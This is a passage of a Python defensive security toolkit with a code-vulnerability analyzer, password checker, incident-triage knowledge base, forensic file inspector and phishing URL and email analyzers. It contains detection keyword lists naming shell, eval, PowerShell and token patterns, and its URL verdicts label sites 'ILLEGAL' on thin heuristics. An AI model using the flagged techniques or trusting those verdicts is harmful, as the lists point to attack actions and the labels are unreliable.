    for _ in behavior_alerts:                     score -= 8
    score = max(0, min(100, score))

    if score >= 90:   risk, grade = "CLEAN",         "A+"
    elif score >= 75: risk, grade = "LOW RISK",       "A"
    elif score >= 55: risk, grade = "MODERATE RISK",  "B"
    elif score >= 35: risk, grade = "HIGH RISK",      "C"
    else:             risk, grade = "CRITICAL THREAT","F"

    lang_labels = {
        'python':'Python', 'javascript':'JavaScript / Node.js', 'php':'PHP',
        'bash':'Bash / Shell', 'powershell':'PowerShell', 'c':'C / C++',
        'java':'Java', 'go':'Go', 'ruby':'Ruby', 'csharp':'C#',
        'sql':'SQL', 'batch':'Batch / CMD', 'generic':'Generic Script'
    }

    plain_explanation = _build_analysis_report(
        findings, behaviors, behavior_alerts,
        lang_labels.get(lang, lang), tainted_vars, tainted_lines, score
    )

    return {
        "score":                  score,
        "grade":                  grade,
        "risk":                   risk,
        "language":               lang_labels.get(lang, lang),
        "findings":               findings,
        "total_lines":            len(lines),
        "code_snippet":           code_snippet[:1500],
        "plain_explanation":      plain_explanation,
        "summary":                plain_explanation,
        "behaviors":              behaviors,
        "behavior_alerts":        behavior_alerts,
        "input_sources_detected": bool(tainted_vars or tainted_lines),
        "taint_vars":             list(tainted_vars.keys()),
    }


def _sink_impact(sink_id):
    impacts = {
        'os_cmd':         "attacker executes arbitrary OS commands with application privileges.",
        'eval_exec':      "attacker executes arbitrary code in the application runtime.",
        'sql_injection':  "attacker reads, modifies, or deletes any database content.",
        'xss':            "attacker injects scripts into victim browsers, stealing sessions or data.",
        'file_write':     "attacker writes arbitrary files to the server filesystem.",
        'path_traversal': "attacker reads arbitrary files outside the intended directory.",
        'deserialization':"attacker triggers arbitrary code execution during deserialization.",
        'network_send':   "server-side request forgery (SSRF) or data exfiltration may be possible.",
    }
    return impacts.get(sink_id, "impact depends on context and data flow.")


def _build_analysis_report(findings, behaviors, behavior_alerts, lang, tainted_vars, tainted_lines, score):
    """Build the full structured plain-English report."""
    lines = []
    lines.append(f"╔══════════════════════════════════════════════╗")
    lines.append(f"║         SECURITY CODE ANALYSIS REPORT        ║")
    lines.append(f"╚══════════════════════════════════════════════╝")
    lines.append(f"")
    lines.append(f"Language     : {lang}")
    lines.append(f"Score        : {score}/100")
    lines.append(f"Taint Sources: {len(tainted_vars)} variable(s) tracked from external input")
    lines.append(f"Total Findings: {len(findings)}")
    lines.append(f"")

    if not findings and not behavior_alerts:
        lines.append("VERDICT: CLEAN — No exploitable patterns detected.")
        lines.append("")
        lines.append("Analysis performed:")
        lines.append("  ✓ Comment and string literal stripping (prevents false positives)")
        lines.append("  ✓ External input source detection")
        lines.append("  ✓ Multi-pass taint propagation")
        lines.append("  ✓ Dangerous sink matching (OS cmd, SQL, eval, XSS, deserialization...)")
        lines.append("  ✓ Behavior chain detection (obfuscation, persistence, C2...)")
        if tainted_vars:
            lines.append(f"")
            lines.append(f"Input sources were detected ({list(tainted_vars.keys())})")
            lines.append("but none reached a dangerous sink in confirmed analysis.")
        return "\n".join(lines)

    crit  = [f for f in findings if f["severity"] == "CRITICAL"]
    high  = [f for f in findings if f["severity"] == "HIGH"]
    med   = [f for f in findings if f["severity"] == "MEDIUM"]
    low   = [f for f in findings if f["severity"] in ("LOW","INFO")]

    def finding_block(f):
        blk = []
        blk.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        blk.append(f"Finding   : {f['name']}")
        blk.append(f"CWE       : {f['cwe']}")
        blk.append(f"Severity  : {f['severity']}   Confidence: {f['confidence']}%")
        blk.append(f"Line      : {f['line']}  →  {f['code'][:80]}")
        blk.append(f"Reachable : {f.get('reachability', 'N/A')}")
        blk.append(f"")
        if f.get('propagation_chain'):
            blk.append("TAINT FLOW:")
            for step in f['propagation_chain']:
                blk.append(f"  {step}")
            blk.append("")
        blk.append(f"EVIDENCE  : {f['taint_evidence']}")
        blk.append(f"")
        blk.append(f"WHY IT MATTERS:")
        blk.append(f"  {f['desc'][:300]}")
        blk.append(f"")
        blk.append(f"REMEDIATION ({lang}):")
        blk.append(f"  {f['fix']}")
        return "\n".join(blk)

    if crit:
        lines.append(f"■ CRITICAL FINDINGS ({len(crit)})")
        for f in crit: lines.append(finding_block(f))
    if high:
        lines.append(f"■ HIGH RISK FINDINGS ({len(high)})")
        for f in high: lines.append(finding_block(f))
    if med:
        lines.append(f"■ MEDIUM RISK FINDINGS ({len(med)})")
        for f in med: lines.append(finding_block(f))
    if low:
        lines.append(f"■ LOW / INFORMATIONAL ({len(low)})")
        for f in low:
            lines.append(f"  • Line {f['line']}: {f['name']} (Confidence: {f['confidence']}%)")

    if behavior_alerts:
        lines.append("")
        lines.append("■ SUSPICIOUS BEHAVIOR CHAINS:")
        for a in behavior_alerts: lines.append(f"  {a}")

    if behaviors:
        lines.append("")
        lines.append("■ DETECTED BEHAVIORS:")
        for b in _build_behavior_summary(behaviors): lines.append(f"  {b}")

    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("ANALYSIS NOTES:")
    lines.append("  • Comments and string literals excluded to prevent false positives.")
    lines.append("  • Severity elevated only when taint path from user input to sink is confirmed.")
    lines.append("  • 'Capability only' findings require manual review to confirm exploitability.")
    lines.append("  • Confidence % reflects data-flow evidence strength, not probability.")

    return "\n".join(lines)


# ─── Keep legacy plain-English function for HTML render compatibility ─────────

def explain_malicious_code_plain_english(code_snippet, findings):
    """Legacy wrapper — calls the new analyzer for summary."""
    result = analyze_code_security(code_snippet)
    return result.get("plain_explanation", "Analysis complete.")



# ------------------------------------------------------------
# MODULE: PASSWORD STRENGTH ANALYZER
# ------------------------------------------------------------

def analyze_password_strength(password):
    """
    Analyze password strength with scoring, risk study, and remediation instructions.
    Returns genuine, accurate strength assessment.
    """
    if not password:
        return {"error": "Please enter a password to analyze."}

    score = 0
    issues = []
    good_points = []
    tips = []

    length = len(password)
    has_upper = bool(re.search(r'[A-Z]', password))
    has_lower = bool(re.search(r'[a-z]', password))
    has_digit = bool(re.search(r'[0-9]', password))
    has_special = bool(re.search(r'[^A-Za-z0-9]', password))
    has_space = ' ' in password
    unique_chars = len(set(password))

    # Common passwords list (sample)
    common_passwords = {
        'password', '123456', 'password123', 'admin', 'letmein', 'qwerty', 'abc123',
        'monkey', '1234567', '12345678', '123456789', 'welcome', 'login', 'pass',
        'iloveyou', 'sunshine', 'princess', 'football', 'shadow', 'master',
        'dragon', 'batman', 'trustno1', 'hello', 'root', 'toor', 'test',
        'guest', 'password1', 'abc', '111111', '000000', 'pass123'
    }

    # Check for common passwords
    is_common = password.lower() in common_passwords
    if is_common:
        issues.append(("CRITICAL", "Breached/Common Password", "This exact password appears in known breach databases and hacker wordlists. It will be cracked in under 1 second by automated tools."))
        score -= 60
    else:
        score += 10

    # Length scoring
    if length < 8:
        issues.append(("CRITICAL", "Too Short (< 8 chars)", f"Your password is only {length} characters. Minimum safe length is 12 characters. Brute force tools crack < 8 char passwords in seconds."))
        score += 0
    elif length < 12:
        issues.append(("HIGH", "Short Password (8-11 chars)", f"Length {length} is acceptable but weak. Upgrade to 16+ characters for strong security."))
        score += 20
        tips.append("Increase to at least 16 characters by adding words or phrases.")
    elif length < 16:
        good_points.append(f"Good length: {length} characters")
        score += 35
    elif length < 20:
        good_points.append(f"Strong length: {length} characters")
        score += 45
    else:
        good_points.append(f"Excellent length: {length} characters")
        score += 55
        tips.append("Excellent length! This is passphrase-level security.")

    # Character variety
    variety = sum([has_upper, has_lower, has_digit, has_special])
    if has_upper:
        good_points.append("Contains uppercase letters (A-Z)")
        score += 10
    else:
        issues.append(("MEDIUM", "No Uppercase Letters", "Add at least 2 uppercase letters (A-Z) to increase character space."))
        tips.append("Add uppercase letters: Example 'secure' → 'SecurE'")

    if has_lower:
        good_points.append("Contains lowercase letters (a-z)")
        score += 5
    else:
        issues.append(("MEDIUM", "No Lowercase Letters", "Mix in lowercase letters for better entropy."))

    if has_digit:
        good_points.append("Contains digits (0-9)")
        score += 10
    else:
        issues.append(("HIGH", "No Numbers", "Add numbers (0-9) to significantly increase password complexity."))
        tips.append("Add numbers mixed in: 'password' → 'p4ssw0rd' (but avoid simple substitutions)")

    if has_special:
        good_points.append("Contains special characters (!@#$...)")
        score += 15
    else:
        issues.append(("HIGH", "No Special Characters", "Add special characters like !@#$%^&*() to exponentially increase crack time."))
        tips.append("Add special characters: 'password' → 'P@ssw0rd!' or use symbols anywhere")

    if has_space:
        good_points.append("Contains space (passphrase structure)")
        score += 5

    # Unique character ratio
    uniqueness_ratio = unique_chars / max(length, 1)
    if uniqueness_ratio > 0.7:
        good_points.append(f"High character diversity ({unique_chars} unique chars)")
        score += 10
    elif uniqueness_ratio < 0.4:
        issues.append(("MEDIUM", "Low Character Diversity", f"Only {unique_chars} unique characters out of {length}. Avoid repeating characters."))
        score -= 5

    # Sequential/repeated patterns
    has_sequential = bool(re.search(r'(012|123|234|345|456|567|678|789|890|abc|bcd|cde|def|efg|qwe|asd|zxc)', password.lower()))
    has_repeated = bool(re.search(r'(.)\1{2,}', password))
    if has_sequential:
        issues.append(("HIGH", "Sequential Pattern Detected", "Sequential patterns (123, abc, qwe) are in attacker dictionaries and are cracked first."))
        score -= 15
        tips.append("Avoid keyboard walks (qwerty, asdfgh) and sequences (1234, abcd).")
    if has_repeated:
        issues.append(("MEDIUM", "Repeated Characters Detected", "Repeated characters (aaa, 111) reduce entropy significantly."))
        score -= 10

    score = max(0, min(100, score))

    # Determine strength tier
    if score >= 80:
        strength = "VERY STRONG"
        strength_color = "#00ffab"
        grade = "A+"
        crack_time = "Centuries (100+ years with current hardware)"
        verdict = "Excellent password! This is highly resistant to automated cracking tools, brute force, and dictionary attacks."
    elif score >= 65:
        strength = "STRONG"
        strength_color = "#34d399"
        grade = "A"
        crack_time = "Years to decades"
        verdict = "Strong password. Minor improvements would make it uncrackable for foreseeable future."
    elif score >= 50:
        strength = "MODERATE"
        strength_color = "#facc15"
        grade = "B"
        crack_time = "Days to weeks (with GPU cracking rigs)"
        verdict = "Acceptable but improvable. Add length and special characters."
    elif score >= 30:
        strength = "WEAK"
        strength_color = "#f97316"
        grade = "C"
        crack_time = "Minutes to hours"
        verdict = "Weak password. A basic cracking tool would break this in under an hour."
    else:
        strength = "CRITICALLY WEAK"
        strength_color = "#ef4444"
        grade = "F"
        crack_time = "Under 1 second to a few seconds"
        verdict = "DANGER: This password provides virtually no security. Change it immediately!"

    # High-security password instructions
    high_security_instructions = [
        "1. LENGTH: Use minimum 16-20 characters. Each extra character EXPONENTIALLY increases crack time.",
        "2. PASSPHRASE: Combine 4-5 random unrelated words (e.g., 'Correct-Horse-Battery-Staple-7!').",
        "3. UNIQUENESS: Never reuse passwords across websites. One breach = all accounts compromised.",
        "4. NO PERSONAL INFO: Avoid names, birthdays, usernames, or any info attackers can OSINT from social media.",
        "5. MFA ALWAYS: Enable TOTP (Google Authenticator) or FIDO2 hardware key on top of any password.",
        "6. PASSWORD MANAGER: Use Bitwarden, KeePass, or 1Password to generate and store unique 20+ char passwords.",
        "7. REGULAR ROTATION: Change passwords every 90 days for critical accounts (banking, email, admin).",
        "8. BREACH CHECK: Regularly verify your email at HaveIBeenPwned.com to detect credential exposure.",
    ]

    return {
        "password_length": length,
        "score": score,
        "grade": grade,
        "strength": strength,
        "strength_color": strength_color,
        "crack_time": crack_time,
        "verdict": verdict,
        "has_upper": has_upper,
        "has_lower": has_lower,
        "has_digit": has_digit,
        "has_special": has_special,
        "has_space": has_space,
        "unique_chars": unique_chars,
        "character_variety": variety,
        "is_common": is_common,
        "issues": issues,
        "good_points": good_points,
        "tips": tips,
        "high_security_instructions": high_security_instructions
    }

# ------------------------------------------------------------
# MODULE 5: CYBER ATTACK TRIAGE & FORENSIC RESPONDER
# Allows users to select attack type and diagnose their issue
# ------------------------------------------------------------

def triage_cyber_attack(attack_type, user_evidence, file_info=None):
    """
    Comprehensive attack diagnosis engine for all 10 major cyber attack categories.
    Outputs threat confirmation, plain-English breakdown, containment steps,
    evidence collection checklist, and mitigation directives.
    """
    at = attack_type.strip()
    ev = user_evidence.strip()

    knowledge_base = {
        "ransomware": {
            "title": "🛑 Ransomware & System Extortion Attack",
            "severity": "CRITICAL EMERGENCY",
            "anatomy": "Ransomware operators gain initial access, execute reconnaissance, delete volume shadow copies and backups, and deploy symmetric encryption across documents, databases, and network shares.",
            "containment": [
                "1. **Disconnect Network / Unplug Cable**: Immediately disconnect the affected machine from LAN and Wi-Fi to stop lateral spread.",
                "2. **DO NOT Shut Down**: Do not reboot or power off the machine; shutting down wipes volatile encryption keys stored in RAM.",
                "3. **Isolate Active Directory / Shared Drives**: Disable compromised user accounts and revoke write permissions on SMB network shares.",
                "4. **Preserve Ransom Note & Sample**: Save the ransom note text and an encrypted sample file for ransomware family identification (ID Ransomware)."
            ],
            "evidence": ["RAM memory dump", "Windows Event Logs (System & Security IDs 1102, 7045, 4688)", "Volume Shadow Copy deletion logs", "Ransom note file"],
            "hardening": "Enforce offline immutable write-once backups (3-2-1 rule), restrict PowerShell ConstrainedLanguage mode, and deploy EDR isolation."
        },
        "phishing": {
            "title": "🎣 Phishing, Credential Harvesting & BEC Fraud",
            "severity": "HIGH RISK",
            "anatomy": "Threat actors spoof organizational identities, send urgent coercion lures ('Account Locked', 'Invoice Due'), and redirect victims to fake credential harvesting portals or malicious macros.",
            "containment": [
                "1. **Revoke Active Sessions**: Terminate all active OAuth and SSO sessions immediately (Log Out of All Devices).",
                "2. **Force Password Reset**: Reset password from a separate, known-clean device.",
                "3. **Enforce FIDO2 / Authenticator MFA**: Remove SMS verification and enforce TOTP or hardware security keys.",
                "4. **Audit Mailbox Forwarding Rules**: Check Outlook/Gmail inbox rules for unauthorized forwarding to external attacker addresses."
            ],
            "evidence": ["Full raw RFC 822 email headers", "Authentication-Results (SPF/DKIM/DMARC verdicts)", "Destination URL redirect trace", "Mailbox inbox rule audit logs"],
            "hardening": "Enforce strict DMARC p=reject, deploy email banner warnings on external senders, and disable legacy basic authentication."
        },
        "ddos": {
            "title": "🌊 DDoS & Botnet Volumetric Flood Attack",
            "severity": "HIGH AVAILABILITY THREAT",
            "anatomy": "Compromised IoT botnets generate millions of SYN packets, UDP reflection floods, or HTTP GET/POST layer-7 requests to overwhelm web servers and saturate bandwidth.",
            "containment": [
                "1. **Activate Cloudflare / Akamai Under Attack Mode**: Enable JavaScript challenge or Managed Challenge at the CDN edge.",
                "2. **Filter Offending ASNs & Geo-IPs**: Block traffic from geographic regions with anomalous request spikes.",
                "3. **Tune Web Server Keep-Alive & Rate Limits**: Reduce nginx client_body_timeout and enforce limit_req_zone rate-limiting.",
                "4. **Drop Spoofed UDP / ICMP at Edge**: Disallow incoming UDP fragments and direct server IP traffic."
            ],
            "evidence": ["Web server access.log high-frequency IPs", "Netflow / sFlow packet dumps", "TCP connection state distribution (netstat -ant | grep SYN_RECV)"],
            "hardening": "Hide origin IP behind Cloudflare Magic Transit or AWS Shield, restrict origin firewall to only accept traffic from CDN IP blocks."
        },
        "webapp": {
            "title": "💥 Web Application Exploitation (SQLi / XSS / RCE / Webshell)",
            "severity": "CRITICAL RISK",
            "anatomy": "Attackers probe input fields for missing sanitization to inject SQL queries, plant PHP/JSP webshells, or exploit deserialization vulnerabilities to achieve arbitrary server execution.",
            "containment": [
                "1. **Quarantine Uploaded Files**: Inspect the web upload directory for unauthorized `.php`, `.phtml`, or `.jsp` files and remove execution permissions.",
                "2. **Enable WAF Strict Rules**: Enable SQL Injection and RCE virtual patching rules on your Web Application Firewall.",
                "3. **Rotate Database Credentials**: If SQLi is suspected, assume database secrets are compromised and rotate all connection strings.",
                "4. **Inspect Web Server Process Tree**: Check running processes for unauthorized `/bin/sh` or `cmd.exe` spawned by `www-data` or `apache`."
            ],
            "evidence": ["Web server access and error logs", "Modified file timestamps in web root", "Database query audit logs", "Uploaded file hashes"],
            "hardening": "Use parameterized queries, enforce strict Content-Security-Policy (CSP), and configure read-only file systems for web server roots."
        },
        "malware": {
            "title": "🦠 Malware Dropper, Trojan & Backdoor / Reverse Shell",
            "severity": "CRITICAL THREAT",
            "anatomy": "A trojan payload executes locally, establishes persistence via Scheduled Tasks or Registry Run keys, and connects back to an attacker Command & Control (C2) server.",
            "containment": [
                "1. **Kill Malicious Process**: Identify the suspicious PID using `Get-Process` or `ps aux` and terminate immediately.",
                "2. **Remove Persistence**: Check `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`, Task Scheduler, and `/etc/crontab`.",
                "3. **Block Outbound C2 IP**: Add firewall egress drop rules for the attacker's IP and port.",
                "4. **Run Full Forensic Antivirus Sweep**: Execute Windows Defender Offline Scan or bootable rescue media."
            ],
            "evidence": ["Process execution command lines", "Outbound network socket connections", "Persistence registry keys", "File hash submitted to VirusTotal"],
            "hardening": "Deploy AppLocker or WDAC to block unauthorized executables from running in `AppData` and `Temp` folders."
        },
        "credentials": {
            "title": "🔓 Credential Stuffing & Password Brute Force",
            "severity": "HIGH IDENTITY THREAT",
            "anatomy": "Automated tools leverage previously breached username/password dumps to attempt unauthorized logins across multiple web services simultaneously.",
            "containment": [
                "1. **Enforce Account Lockout & CAPTCHA**: Trigger rate-limiting and Cloudflare Turnstile on consecutive failed login attempts.",
                "2. **Reset Compromised Passwords**: Identify accounts with successful logins from anomalous IP addresses and force reset.",
                "3. **Block Proxy / Tor Exit Nodes**: Deny authentication attempts originating from known commercial proxy or Tor exit relays."
            ],
            "evidence": ["Authentication logs with failed login spikes", "Source IP list matching proxy lists", "Targeted user account lists"],
            "hardening": "Deploy HaveIBeenPwned password screening API to prevent users from choosing breached passwords."
        },
        "stego": {
            "title": "🎭 Steganography & Covert Channel Exfiltration",
            "severity": "HIGH FORENSIC THREAT",
            "anatomy": "Threat actors conceal stolen corporate data or malware droppers inside innocent-looking JPEG, PNG, or audio files to bypass Data Loss Prevention (DLP) filters.",
            "containment": [
                "1. **Extract Hidden Payload**: Use our 'Reverse Image & Stego' inspector to extract any bytes appended after the image End-Of-File marker.",
                "2. **Inspect EXIF Metadata**: Look for encoded PHP or PowerShell scripts hidden in camera metadata tags.",
                "3. **Block Untrusted File Uploads**: Re-encode uploaded user images through image processing libraries (GD/Pillow) to strip appended stego data."
            ],
            "evidence": ["Calculated Shannon entropy score (> 7.5)", "Extracted appended bytes past EOF", "Stripped EXIF metadata tags"],
            "hardening": "Deploy content disarm and reconstruction (CDR) to re-render all incoming and outgoing image attachments."
        }
    }

    # Normalize key
    key = "ransomware"
    at_lower = at.lower()
    for k in knowledge_base:
        if k in at_lower:
            key = k
            break

    profile = knowledge_base.get(key, knowledge_base["ransomware"])

    # Analyze user evidence against profile
    findings = []
    if ev:
        if any(w in ev.lower() for w in [".locked", "ransom", "decrypt", "shadow"]):
            findings.append("Confirmed Ransomware indicators detected in evidence text.")
        if any(w in ev.lower() for w in ["eval", "exec", "shell", "cmd", "select *"]):
            findings.append("Confirmed Web Application / Code Injection indicators detected.")
        if any(w in ev.lower() for w in ["from:", "subject:", "urgent", "invoice", "password"]):
            findings.append("Confirmed Social Engineering / Phishing lure text detected.")

    return {
        "attack_type": at,
        "title": profile["title"],
        "severity": profile["severity"],
        "anatomy": profile["anatomy"],
        "containment": profile["containment"],
        "evidence_checklist": profile["evidence"],
        "hardening": profile["hardening"],
        "evidence_findings": findings,
        "user_evidence": ev[:1000]
    }

# ------------------------------------------------------------
# MODULE 6: DIGITAL FORENSIC TOOLKIT
# Magic bytes identifier, entropy, strings & decoder
# ------------------------------------------------------------

def inspect_forensic_file(raw_bytes, filename="evidence_artifact.bin"):
    meta = {
        "filename": filename,
        "size_bytes": len(raw_bytes),
        "size_kb": f"{len(raw_bytes) / 1024:.2f} KB",
        "md5": hashlib.md5(raw_bytes).hexdigest(),
        "sha1": hashlib.sha1(raw_bytes).hexdigest(),
        "sha256": hashlib.sha256(raw_bytes).hexdigest(),
        "entropy": calculate_entropy(raw_bytes),
        "entropy_verdict": "",
        "true_file_type": "Unknown Binary Data",
        "extension_spoof_alert": None,
        "extracted_strings": [],
        "hex_preview": ""
    }

    # 1. Magic Bytes Inspection
    signatures = [
        (b"\xff\xd8\xff", "JPEG Image (.jpg / .jpeg)"),
        (b"\x89PNG\r\n\x1a\n", "PNG Image (.png)"),
        (b"GIF87a", "GIF Image (.gif)"),
        (b"GIF89a", "GIF Image (.gif)"),
        (b"%PDF-", "Adobe PDF Document (.pdf)"),
        (b"PK\x03\x04", "ZIP / Office Document / APK Archive (.zip, .docx, .xlsx, .apk)"),
        (b"MZ", "Windows PE Executable / DLL (.exe, .dll, .sys)"),
        (b"\x7fELF", "Linux ELF Executable (.bin, .so)"),
        (b"7z\xbc\xaf\x27\x1c", "7-Zip Archive (.7z)"),
        (b"Rar!\x1a\x07", "RAR Archive (.rar)"),
        (b"\x1f\x8b\x08", "GZIP Compressed File (.gz)")
    ]

    for magic, desc in signatures:
        if raw_bytes.startswith(magic):
            meta["true_file_type"] = desc
            break

    # Extension Spoofing Detection
    ext = os.path.splitext(filename)[1].lower()
    if meta["true_file_type"].startswith("Windows PE Executable") and ext in [".pdf", ".jpg", ".png", ".docx", ".txt", ".mp4"]:
        meta["extension_spoof_alert"] = f"🚨 CRITICAL SPOOF ALERT: File is named '{filename}' ({ext}) but its true internal file header is a Windows Executable (MZ PE)! Classic malware dropper disguise technique!"
    elif meta["true_file_type"].startswith("ZIP") and ext in [".jpg", ".png", ".pdf"]:
        meta["extension_spoof_alert"] = f"⚠️ POLYGLOT ALERT: File is named '{filename}' but starts with a ZIP archive header (PK\x03\x04)!"

    # 2. Shannon Entropy Verdict
    ent = meta["entropy"]
    if ent > 7.5:
        meta["entropy_verdict"] = f"HIGH ENTROPY ({ent}/8.0): Likely Encrypted, Packed, or Steganographic Payload! Typical of ransomware or obfuscated malware."
    elif ent > 6.0:
        meta["entropy_verdict"] = f"MODERATE ENTROPY ({ent}/8.0): Standard compressed binary, compiled code, or image asset."
    else:
        meta["entropy_verdict"] = f"LOW ENTROPY ({ent}/8.0): Plain text, human-readable script, or uncompressed configuration file."

    # 3. Printable Strings Extraction (ASCII & Unicode >= 4 chars)
    ascii_strings = re.findall(rb"[A-Za-z0-9_\-\.\:\/\\@\?=&]{4,}", raw_bytes)
    decoded_strings = []
    for s in ascii_strings[:200]:
        try:
            ds = s.decode("ascii", errors="ignore")
            # Highlight interesting patterns
            if any(k in ds.lower() for k in ["http", "https", "cmd", "powershell", "eval", "pass", "admin", ".exe", ".sh", "select", "token"]):
                decoded_strings.append(f"⭐ {ds}")
            elif re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ds):
                decoded_strings.append(f"🌐 IP: {ds}")
            else:
                decoded_strings.append(ds)
        except Exception:
            pass
    meta["extracted_strings"] = decoded_strings[:60]

    # 4. Hex Preview (First 128 bytes)
    hex_lines = []
    sample = raw_bytes[:128]
    for i in range(0, len(sample), 16):
        chunk = sample[i:i + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        hex_lines.append(f"{i:04x}  {hex_part:<48}  |{ascii_part}|")
    meta["hex_preview"] = "\n".join(hex_lines)

    return meta

# ------------------------------------------------------------
# MODULE 7: WEBSITE / URL PHISHING & HEADERS
# ------------------------------------------------------------

def analyze_url_security(url_input):
    clean = url_input.strip()
    if not clean:
        return {"error": "Please enter a valid website URL."}

    parsed = urllib.parse.urlparse(clean if "://" in clean else "https://" + clean)
    host = parsed.netloc.lower().split(":")[0]
    scheme = parsed.scheme.lower() or "https"

    score = 100
    phishing_indicators = []
    
    if re.fullmatch(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", host):
        score -= 40
        phishing_indicators.append("URL uses raw numerical IP address instead of domain name (standard phishing indicator).")

    if host.startswith("xn--") or ".xn--" in host:
        score -= 35
        phishing_indicators.append("Punycode (xn--) detected: Possible homograph attack spoofing lookalike letters.")

    brands = ["paypal", "apple", "microsoft", "google", "netflix", "amazon", "chase", "wellsfargo", "bank", "login", "verify", "secure", "support", "account"]
    for b in brands:
        if b in host and not host.endswith(f"{b}.com") and host != f"{b}.com" and not host.endswith(f".{b}.com"):
            score -= 35
            phishing_indicators.append(f"Brand impersonation alert: Keyword '{b}' used on unauthorized domain ({host}).")
            break

    tlds = [".xyz", ".top", ".tk", ".ml", ".ga", ".cf", ".gq", ".buzz", ".bid", ".club", ".work", ".date", ".cam"]
    for tld in tlds:
        if host.endswith(tld):
            score -= 15
            phishing_indicators.append(f"High-abuse top-level domain detected ({tld}).")
            break

    if host.count(".") >= 4:
        score -= 15
        phishing_indicators.append("Excessive subdomain depth (>= 4 dots). Common technique to evade URL reputation filters.")

    target_url = f"{scheme}://{host}"
    headers_found = {}
    missing_headers = []
    server_tech = "Unknown"
    ssl_active = False

    required_headers = [
        ("Strict-Transport-Security", "HSTS - Enforces HTTPS only, prevents SSL stripping and cookie interception", "add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;"),
        ("Content-Security-Policy", "CSP - Restricts script origins, prevents XSS, malicious injections, and clickjacking", "add_header Content-Security-Policy \"default-src 'self'; script-src 'self';\" always;"),
        ("X-Frame-Options", "Prevents clickjacking framing by forbidding iframing on external rogue sites", "add_header X-Frame-Options \"DENY\" always;"),
        ("X-Content-Type-Options", "Prevents MIME-sniffing exploits (nosniff)", "add_header X-Content-Type-Options \"nosniff\" always;"),
        ("Referrer-Policy", "Controls leakage of private referral paths to external domains", "add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;"),
        ("Permissions-Policy", "Restricts camera, microphone, and geolocation hardware access", "add_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;")
    ]

    is_safe, safe_reason = is_safe_public_url(target_url)
    if not is_safe:
        server_tech = f"Blocked: {safe_reason}"
        for h_name, h_desc, h_fix in required_headers:
            missing_headers.append((h_name, h_desc, h_fix))
    else:
        try:
            req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0 BehindUrDigitalLife/6.0"})
            ctx = get_doh_ssl_context()
            with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
                resp_headers = resp.headers
            server_tech = resp_headers.get("Server", "Protected / Undisclosed")
            if "X-Powered-By" in resp_headers:
                server_tech += f" / {resp_headers['X-Powered-By']}"

            ssl_active = target_url.startswith("https")
            for h_name, h_desc, h_fix in required_headers:
                if h_name in resp_headers:
                    headers_found[h_name] = resp_headers[h_name]
                else:
                    missing_headers.append((h_name, h_desc, h_fix))
        except Exception as e:
            server_tech = f"Protected / Cloudflare / Offline ({str(e)[:45]})"
            for h_name, h_desc, h_fix in required_headers:
                missing_headers.append((h_name, h_desc, h_fix))

    header_score = max(100 - len(missing_headers) * 15, 10)
    final_score = int((score * 0.6) + (header_score * 0.4))
    
    if final_score >= 80:
        verdict = "STRONG SECURITY POSTURE"
        security_level = "Strong"
        legality = "LEGAL / COMPLIANT"
        legitimacy = "LEGITIMATE / AUTHENTIC"
    elif final_score >= 50:
        verdict = "MODERATE SECURITY POSTURE"
        security_level = "Moderate"
        legality = "UNCERTAIN / CAUTION ADVISED"
        legitimacy = "UNCERTAIN / POTENTIAL RISK"
    else:
        verdict = "WEAK / HIGH PHISHING THREAT"
        security_level = "Weak"
        legality = "ILLEGAL / ROGUE / PIRACY RISK"
        legitimacy = "NOT LEGITIMATE / PHISHING & SCAM"

    return {
        "url": clean,
        "host": host,
        "scheme": scheme,
        "score": final_score,
        "security_level": security_level,
        "verdict": verdict,
        "legality": legality,
        "legitimacy": legitimacy,
        "ssl_active": ssl_active,
        "phishing_indicators": phishing_indicators,
        "server_tech": server_tech,
        "headers_found": headers_found,
        "missing_headers": missing_headers
    }


def analyze_phishing_email(raw_email):
    text = raw_email.strip()
    if not text:
        return {"error": "Please paste email headers or email body."}

    score = 100
    indicators = []

    from_match = re.search(r"From:\s*\"?([^\"<\n]+)\"?\s*<([^>]+)>", text, re.IGNORECASE)
    if from_match:
        disp_name, from_email = from_match.group(1).strip(), from_match.group(2).strip()
        disp_lower = disp_name.lower()
        from_lower = from_email.lower()
        if any(b in disp_lower for b in ["paypal", "apple", "google", "microsoft", "chase", "bank", "support"]) and not any(b in from_lower for b in ["paypal.com", "apple.com", "google.com", "microsoft.com", "chase.com"]):
            score -= 40
            indicators.append(f"CRITICAL SPOOF: Display name '{disp_name}' impersonates official brand, but sender address is '{from_email}'.")

    coercive = [
        ("account suspended", 25, "Urgent account suspension threat"),
        ("verify your identity", 20, "Credential harvest lure"),
        ("immediate action required", 20, "Artificial panic / urgency trigger"),
        ("unauthorized login detected", 20, "Fear-based social engineering lure"),
        ("wire transfer", 20, "Business Email Compromise (BEC) lure"),
        ("invoice attached", 15, "Malware payload dropper lure"),
        ("password will expire", 20, "Credential harvest lure")
    ]
    for phrase, penalty, desc in coercive:
        if phrase in text.lower():
            score -= penalty
            indicators.append(f"Phishing Language: '{phrase}' ({desc})")

    extracted_urls = re.findall(r"https?://[^\s<>\"']+", text)

    score = max(score, 5)
    is_phishing = score < 60
    verdict = "PHISHING / SOCIAL ENGINEERING ATTACK" if is_phishing else ("SUSPICIOUS / EXERCISE CAUTION" if score < 80 else "LEGITIMATE / LOW RISK")

    return {
        "score": score,
        "is_phishing": is_phishing,
        "verdict": verdict,
        "indicators": indicators,
        "extracted_urls": extracted_urls[:8]
    }

# ------------------------------------------------------------
# MODULE 8: IP ADDRESS INTELLIGENCE & PORT PROBER
# ------------------------------------------------------------

def inspect_ip_address(ip_target):
    target = ip_target.strip()
    if not target:
        return {"error": "Please enter an IP address or hostname."}

    try:
        ip = socket.gethostbyname(target)
    except Exception:
        ip = target

